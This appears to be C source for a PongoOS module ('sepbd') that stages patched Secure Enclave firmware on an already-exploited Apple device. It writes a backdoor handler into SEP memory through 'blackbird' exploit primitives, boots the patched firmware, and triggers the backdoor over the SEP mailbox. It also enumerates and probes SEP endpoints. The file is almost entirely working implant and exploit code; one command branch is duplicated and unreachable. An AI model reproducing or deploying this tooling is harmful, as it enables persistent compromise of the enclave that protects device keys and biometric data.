// ─── pure mailbox test (no blackbird): fire a backdoor-tagged message ──
// Post-boot the mailbox is owned by SEOS. This sends one message shaped
// for the backdoor (ep 0xBD, tag 0x42, opcode 0xBC, data = handler VA) and
// watches the receive slot for a reply. It CANNOT reach the handler unless
// something inside SEOS routes it — that router is the remaining piece.
// Purpose: prove the mailbox channel itself is alive after boot and show
// whatever SEOS does with an unknown endpoint.
static void sepbd_mping_cmd(const char *cmd, char *args) {
    sepbd_mailbox_init();
    if (!g_mb32 && !g_mb64) { iprintf("sepbd: mailbox regs not mapped\n"); return; }

    // control groups: no arg = our ep 0xBD; "ctl<xx>" sends an arbitrary
    // endpoint with zeroed tag/op (junk endpoints must stay silent, live
    // ones like 0xFF may answer); "regs" dumps the raw mailbox registers.
    uint8_t ep = 0xBD; uint8_t tag = 0x42, op = 0xBC;
    if (args && args[0]=='c' && args[1]=='t' && args[2]=='l') {
        ep = (uint8_t)strtoul(args+3, NULL, 16); tag = 0; op = 0;
    }
    if (args && args[0]=='r' && args[1]=='e' && args[2]=='g' && args[3]=='s') {
        if (g_sep64)
            iprintf("sepbd: regs dis=%x en=%x snd=%x rcv=%x s0=%llx r0=%llx\n",
                    g_mb64->dis_int, g_mb64->en_int, g_mb64->snd_sts, g_mb64->recv_sts,
                    (unsigned long long)g_mb64->snd0, (unsigned long long)g_mb64->recv0);
        else
            iprintf("sepbd: regs dis=%x en=%x snd=%x rcv=%x s0=%x s1=%x r0=%x r1=%x st60=%x\n",
                    g_mb32->dis_int, g_mb32->en_int, g_mb32->snd_sts, g_mb32->recv_sts,
                    g_mb32->snd0, g_mb32->snd1, g_mb32->recv0, g_mb32->recv1,
                    *(volatile uint32_t *)((uintptr_t)g_mb32 + 0x60));
        return;
    }
    // 'ping' rides the KNOWN-GOOD channel: SEPROM answers opcode 1 with
    // {ep=0xff, op=101} while it owns the mailbox (before tz0/resume).
    // Its silence marks the handover boundary; its return means SEPROM
    // is back in control.
    if (args && args[0]=='p' && args[1]=='i' && args[2]=='n' && args[3]=='g') {
        iprintf("sepbd: [seprom-ping] opcode 1 ...\n");
        sep_send_msg(0xFF, 0x0, 1, 0, 0);
        for (int i = 0; i < 200; i++) {
            spin(24000);
            uint64_t r = sep_fast_check_mailbox();
            if (r) {
                iprintf("sepbd: SEPROM ALIVE, reply %016llx after %d ms\n", (unsigned long long)r, i);
                return;
            }
        }
        iprintf("sepbd: seprom silent (mailbox owned by SEOS or dead)\n");
        return;
    }
    // 'ping' = SEPROM's known-good channel: opcode 1 -> {ep=0xff, op=101}
    // while SEPROM owns the mailbox (before tz0/resume). Silence marks the
    // handover boundary or a dead SEP.
    // 'boot' = SEOS's known-good channel: SEOS announces itself on
    // {ep=0, opcode=0xd} (pongo's sep_handle_ctrl_msg_from_sep prints
    // "SEPOS booted!" for exactly this frame) — unsolicited, so this just
    // waits for it and reports who currently owns the mailbox.
    if (args && args[0]=='p' && args[1]=='i' && args[2]=='n' && args[3]=='g') {
        iprintf("sepbd: [seprom-ping] opcode 1 ...\n");
        sep_send_msg(0xFF, 0x0, 1, 0, 0);
        for (int i = 0; i < 200; i++) {
            spin(24000);
            uint64_t r = sep_fast_check_mailbox();
            if (r) {
                iprintf("sepbd: SEPROM ALIVE, reply %016llx after %d ms\n", (unsigned long long)r, i);
                return;
            }
        }
        iprintf("sepbd: seprom silent (mailbox owned by SEOS or dead)\n");
        return;
    }
    if (args && args[0]=='b' && args[1]=='o' && args[2]=='o' && args[3]=='t') {
        iprintf("sepbd: [seos-wait] listening for {ep=0, op=0xd} boot announce...\n");
        for (int i = 0; i < 600; i++) {  // 6s
            spin(24000);
            uint64_t r = sep_fast_check_mailbox();
            if (r) {
                union sepbd_msg_u rm = {.val = r};
                iprintf("sepbd: SEOS frame after %d ms: ep=%x op=%x data=%x%s\n",
                        i, rm.msg.ep, rm.msg.opcode, rm.msg.data,
                        (rm.msg.ep == 0 && rm.msg.opcode == 0xd) ? "  << SEOS BOOTED" : "");
                return;
            }
        }
        iprintf("sepbd: no SEOS frame in 6000 ms (not booted / not announcing)\n");
        return;
    }
    // 'probe4': the polling endpoint (j71s endpoint table item 0,
    // {flag=0, ep=4}) is the one endpoint designed for AP-initiated
    // request/response without interrupts. Fire a battery of XNU-style
    // query variants at it and report the first answer.
    if (args && args[0]=='p' && args[1]=='r' && args[2]=='o' && args[3]=='b' && args[4]=='e' && args[5]=='4') {
        static const struct { uint8_t tag, op; uint32_t data; } variants[] = {
            {0x01, 0x01, 0},        // XNU-style QUERY capability
            {0x00, 0x01, 0},        // op only
            {0x01, 0x00, 0},        // tag only
            {0x42, 0x01, 0},
            {0x00, 0x17, 0},        // 0x17 = XNU sep msg type observed
            {0x00, 0x06, 0x1234},   // misc
        };
        for (unsigned v = 0; v < sizeof variants / sizeof variants[0]; v++) {
            iprintf("sepbd: [probe4] try tag=%x op=%x data=%x ...\n",
                    variants[v].tag, variants[v].op, variants[v].data);
            sep_send_msg(0x04, variants[v].tag, variants[v].op, 0, variants[v].data);
            for (int i = 0; i < 100; i++) {   // 1s per variant
                spin(24000);
                uint64_t r = sep_fast_check_mailbox();
                if (r) {
                    union sepbd_msg_u rm = {.val = r};
                    iprintf("sepbd: REPLY: ep=%x tag=%x op=%x param=%x data=%x\n",
                            rm.msg.ep, rm.msg.tag, rm.msg.opcode, rm.msg.param, rm.msg.data);
                    return;
                }
            }
        }
        iprintf("sepbd: probe4: no answer to any variant\n");
        return;
    }
    if (args && args[0]=='e' && args[1]=='v') {
        // listen for ROM-phase lifecycle frames: {ep=0xff, op=0xd2} startup
        // events (phase 1/2, sent by the loader before/around fwload) and
        // the SEOS {ep=0, op=0xd} boot announce. Any of these proves the
        // SEP side is executing firmware and owns the mailbox.
        iprintf("sepbd: [ev] listening for startup(0xd2)/boot(0xd) frames...\n");
        for (int i = 0; i < 600; i++) {
            spin(24000);
            uint64_t r = sep_fast_check_mailbox();
            if (r) {
                union sepbd_msg_u rm = {.val = r};
                const char *what = "unknown";
                if (rm.msg.ep == 0xFF && rm.msg.opcode == 0xd2) what = "startup event";
                else if (rm.msg.ep == 0 && rm.msg.opcode == 0xd) what = "SEOS BOOTED";
                else if (rm.msg.ep == 0xFF && rm.msg.opcode == 101) what = "seprom ping reply";
                iprintf("sepbd: frame %016llx after %d ms: ep=%x op=%x  << %s\n",
                        (unsigned long long)r, i, rm.msg.ep, rm.msg.opcode, what);
                return;
            }
        }
        iprintf("sepbd: no frame in 6000 ms\n");
        return;
    }
    uint64_t handler = g_handler_sep_va ? g_handler_sep_va : 0x15f5f8ull;
    iprintf("sepbd: [pongo-ch] sending ep=%x tag=%x op=%x data=%x\n", ep, tag, op, (uint32_t)handler);
    sep_send_msg(ep, tag, op, 0, (uint32_t)handler);

    // poll via pongo's own fast-check (proper drain semantics)
    for (int i = 0; i < 200; i++) {
        spin(24000);
        uint64_t r = sep_fast_check_mailbox();
        if (r) {
            iprintf("sepbd: REPLY after %d ms: %016llx\n", i, (unsigned long long)r);
            // pop/clear as pongo does
            if (!g_sep64) { (void)g_mb32->recv0; (void)g_mb32->recv1; }
            return;
        }
    }
    iprintf("sepbd: no mailbox reply in 2000 ms\n");
}

// ─── boot: fwload via mailbox opcodes (mirrors seprom_load_sepos) ──────

static void sepbd_boot_cmd(const char *cmd, char *args) {
    if (!sep_is_pwned) { iprintf("sepbd: sep not pwned\n"); return; }
    sepbd_mailbox_init();
    if (!g_mb32 && !g_mb64) return;

    // fwload: opcode 6, param 0, data = phys(fw) >> 12 — same as sep.c.
    // If sepbd_patch2 ran in this session, its working copy img[] holds the
    // patched container; fwload from THAT, not from the DT's pristine copy
    // (which would overwrite every patch we planted in SEP memory).
    dt_node_t *map = dt_find(gDeviceTree, "/chosen/memory-map");
    if (!map) { iprintf("sepbd: no memory-map node\n"); return; }
    uint32_t len = 0;
    uint64_t *fwent = dt_prop(map, "SEPFW", &len);
    if (!fwent || len < 16) { iprintf("sepbd: no firmware\n"); return; }
    uint64_t phys = vatophys((uint64_t)(uintptr_t)phystokv(fwent[0]));
    if (g_img_size) {
        // stage the patched container into pongo's dedicated fwload buffer
        // (guaranteed DMA-contiguous for the SEPROM fetch), then fwload from
        // there exactly as the pristine path does
        void *fwbuf = phystokv(fwent[0]);
        uint32_t cp = (uint32_t)fwent[1];
        if ((size_t)cp > g_img_size) cp = (uint32_t)g_img_size;
        memcpy(fwbuf, img, cp);
        iprintf("sepbd: patched copy staged into fwload buffer (%x B)\n", cp);
    }
    union sepbd_msg_u m = {.msg = {255, 0, 6, 0, (uint32_t)(phys >> 12)}};
    iprintf("sepbd: fwload phys %llx\n", (unsigned long long)phys);
    mb_send(m.val);
    spin(24000);

    // pwned boot = blackbird jump to 0, mirroring pongo's sep_pwned_boot_auto
    // (sep_blackbird_jump_noreturn(0, sepb)). After the race SEPROM no longer
    // answers opcodes; this jump is how the staged firmware at SEP VA 0 starts
    // executing. noreturn in pongo, but the dispatcher returns control here
    // for cmd 3 (call with r0), so the shell survives.
    extern void sep_blackbird_jump(uint32_t addr, uint32_t r0);
    extern uint32_t sepbp;
    iprintf("sepbd: blackbird boot: jump 0 r0=sepb(%x)\n", sepbp);
    sep_blackbird_jump(0, sepbp);
    spin(24000 * 50);                        // let SEOS boot
    sep_discover_endpoints();                // pongo-side capture (prints table)
    spin(24000 * 50);
    iprintf("sepbd: boot issued (check 'sepbd_mping probe4')\n");
}

// ─── ping: request frame via blackbird, kick via mailbox, read reply ───
static void sepbd_ping_cmd(const char *cmd, char *args) {
    sepbd_recover_state();
    if (!g_handler_sep_va) { iprintf("sepbd: not installed — run 'sepbd_install' first\n"); return; }
    if (!sep_is_pwned) { iprintf("sepbd: sep not pwned\n"); return; }

    // Build the 8-word request in SEP memory through the 4-byte primitives.
    uint64_t f = g_frame_sep_va;
    // 64-bit little-endian words built from two 32-bit writes: low word first.
    bb_write((uint32_t)(f + 0), 1);                 // req[0].lo = cmd PING
    bb_write((uint32_t)(f + 4), 0x44504256);        // req[0].hi = 'VPBD'
    bb_write((uint32_t)(f + 8), 1);                 // req[1].lo = version
    bb_write((uint32_t)(f + 12), 0x7BC);            // req[1].hi = sel
    bb_write((uint32_t)(f + 16), 0x1337);
    for (int i = 20; i < 64; i += 4) bb_write((uint32_t)(f + i), 0);

    // Trigger: the SEOS side receives it through the mailbox — send the
    // backdoor message (ep 255 is protocol; our opcode 0x7BC in the tag
    // field mirrors how SKS messages are addressed) and give the handler a
    // moment to run.
    sepbd_mailbox_init();
    union sepbd_msg_u m = {.msg = {255, (uint8_t)0x7B, 0xBC, 0, (uint32_t)f}};
    mb_send(m.val);
    spin(24000 * 4);

    // Read the reply frame back through the primitives.
    uint32_t r0lo = bb_read((uint32_t)(f + 0)), r0hi = bb_read((uint32_t)(f + 4));
    uint32_t r1lo = bb_read((uint32_t)(f + 8)), r1hi = bb_read((uint32_t)(f + 12));
    uint64_t rsp0 = ((uint64_t)r0hi << 32) | r0lo;
    uint64_t ret0 = ((uint64_t)r1hi << 32) | r1lo;
    iprintf("sepbd: rsp0 = %016llx ret0 = %llx\n",
            (unsigned long long)rsp0, (unsigned long long)ret0);
    if ((rsp0 >> 32) == 0x52504456ull && ret0 == 0x1337) iprintf("sepbd: PONG OK — backdoor fired\n");
    else iprintf("sepbd: no/invalid reply (routing not wired or SEOS not booted)\n");
}


// ─── Discovery closure (module-only, repeatable) ────────────────────
// Protocol facts (alignment/discovery_protocol.md + trigger audit):
//  - SEOS advertises services with frames {ep=0xFD, op=0|1, param=ep_id,
//    data=4CC}; the AP never needs to query for the table itself, but the
//    advertise is EVENT-DRIVEN (three SEP-side triggers), so it can be
//    re-elicited at any time: service-open (XOBM msgid 0x412F/0x4130
//    handlers call the advertise loop at loader 0x915aa/0x91824) and the
//    status-query handler at 0x94ba0 embeds one too.
//  - Endpoints come from the SEPD 28-slot free-scan — runtime values only.
//
// Subcommands (each independently repeatable for debugging):
//   sepbd_disc listen [ms]  passively collect advertise frames
//   sepbd_disc kick         elicit advertise: send {ep=0xFD, op=0x2F}
//                           (XOBM-open shaped stimulus), expect >=1 advertise
//   sepbd_disc table        print the accumulated endpoint table
//   sepbd_disc probe <ep>   one request to <ep> (tag1 op0x17), await reply
#define SEPBD_DISC_EP   0xFDu
#define SEPBD_DISC_MAX  16
struct sepbd_disc_ent { uint32_t fourcc; uint8_t ep; uint8_t op; };
static struct sepbd_disc_ent sepbd_disc_tbl[SEPBD_DISC_MAX];
static unsigned sepbd_disc_n;
static int sepbd_disc_note(uint64_t r) {
    union sepbd_msg_u m = {.val = r};
    if (m.msg.ep != SEPBD_DISC_EP) {
        iprintf("sepbd: [disc] other frame: ep=%x op=%x data=%x\n",
                m.msg.ep, m.msg.opcode, m.msg.data);
        return 0;
    }
    unsigned k;
    for (k = 0; k < sepbd_disc_n; k++)
        if (sepbd_disc_tbl[k].ep == m.msg.param) break;
    if (k == sepbd_disc_n && sepbd_disc_n < SEPBD_DISC_MAX) {
        sepbd_disc_tbl[sepbd_disc_n].fourcc = m.msg.data;
        sepbd_disc_tbl[sepbd_disc_n].ep     = m.msg.param;
        sepbd_disc_tbl[sepbd_disc_n].op     = m.msg.opcode;
        sepbd_disc_n++;
    }
    iprintf("sepbd: [disc] ADVERTISE op=%x ep=%u svc=%c%c%c%c\n",
            m.msg.opcode, m.msg.param,
            (char)(m.msg.data), (char)(m.msg.data >> 8),
            (char)(m.msg.data >> 16), (char)(m.msg.data >> 24));
    return 1;
}
static void sepbd_disc_cmd(const char *cmd, char *args) {
    sepbd_mailbox_init();
    if (!g_mb32 && !g_mb64) { iprintf("sepbd: mailbox regs not mapped\n"); return; }

    if (args && args[0]=='t') {                       // table
        if (!sepbd_disc_n) { iprintf("sepbd: [disc] table empty\n"); return; }
        for (unsigned k = 0; k < sepbd_disc_n; k++)
            iprintf("sepbd: [disc]   %c%c%c%c -> ep %u (op %x)\n",
                    (char)(sepbd_disc_tbl[k].fourcc), (char)(sepbd_disc_tbl[k].fourcc >> 8),
                    (char)(sepbd_disc_tbl[k].fourcc >> 16), (char)(sepbd_disc_tbl[k].fourcc >> 24),
                    sepbd_disc_tbl[k].ep, sepbd_disc_tbl[k].op);
        return;
    }
    if (args && args[0]=='k') {                       // kick: elicit advertise
        iprintf("sepbd: [disc] kick: sending {ep=FD, op=0x2F} ...\n");
        sep_send_msg(SEPBD_DISC_EP, 0x00, 0x2F, 0x00, 0);
        int got = 0;
        for (int i = 0; i < 300; i++) {               // 3s
            spin(24000);
            uint64_t r = sep_fast_check_mailbox();
            if (r) { got += sepbd_disc_note(r); }
            if (got) { iprintf("sepbd: [disc] kick: advertise received (round trip OK)\n"); return; }
        }
        iprintf("sepbd: [disc] kick: no advertise (SEOS down or shape wrong)\n");
        return;
    }
    if (args && args[0]=='p') {                       // probe <ep>
        uint32_t ep = (args[1] == 'r' && args[2] == 'o') ?
            (uint32_t)strtoul(args + 5, NULL, 16) : (uint32_t)strtoul(args + 1, NULL, 16);
        if (!ep) { iprintf("sepbd: [disc] usage: sepbd_disc probe <hexep>\n"); return; }
        iprintf("sepbd: [disc] probing ep=%x ...\n", ep);
        sep_send_msg((uint8_t)ep, 0x01, 0x17, 0, 0);
        for (int i = 0; i < 200; i++) {
            spin(24000);
            uint64_t r = sep_fast_check_mailbox();
            if (r) {
                union sepbd_msg_u m = {.val = r};
                iprintf("sepbd: [disc] REPLY ep=%x tag=%x op=%x data=%x after %d ms\n",
                        m.msg.ep, m.msg.tag, m.msg.opcode, m.msg.data, i);
                return;
            }
        }
        iprintf("sepbd: [disc] no reply from ep %x\n", ep);
        return;
    }
    // default: listen [ms]
    int ms = 2000;
    if (args && args[0]=='l') { char *sp = strchr(args, ' '); if (sp) ms = (int)strtoul(sp + 1, NULL, 0); }
    iprintf("sepbd: [disc] listening %d ms...\n", ms);
    int got = 0;
    for (int i = 0; i < ms; i++) {
        spin(24000);
        uint64_t r = sep_fast_check_mailbox();
        if (r) got += sepbd_disc_note(r);
    }
    iprintf("sepbd: [disc] captured %d frame(s), table has %u entr(y|ies)\n",
            got, sepbd_disc_n);
}

void module_entry(void) {
    sepbd_recover_state();
    command_register("sepbd_install", "write handler into SKS gap of staged sepi", sepbd_install_cmd);
    command_register("sepbd_boot", "fwload + boot SEOS via mailbox", sepbd_boot_cmd);
    command_register("sepbd_patch", "monolithic: patch sepi inside SEP (pre-boot)", sepbd_patch_cmd);
    command_register("sepbd_patch2", "two-stage: tail-gap injector + decompressed-image patches", sepbd_patch2_cmd);
    command_register("sepbd_mping", "pure-mailbox ping (no blackbird)", sepbd_mping_cmd);
    command_register("sepbd_disc", "discover SEP endpoints + optional probe: sepbd_disc [ep]", sepbd_disc_cmd);
    command_register("sepbd_peekimg", "dump words from pulled SEOS image", sepbd_peekimg_cmd);
    command_register("sepbd_b64", "base64 dump: sepbd_b64 <off> <len>", sepbd_b64_cmd);
    command_register("sepbd_ping", "mailbox round-trip test of the backdoor", sepbd_ping_cmd);
    command_register("sepbd_call", "invoke handler directly via blackbird (no SEOS routing)", sepbd_call_cmd);
}

char *module_name = "sepbd";

struct pongo_exports exported_symbols[] = {
    {.name = 0, .value = 0}
};
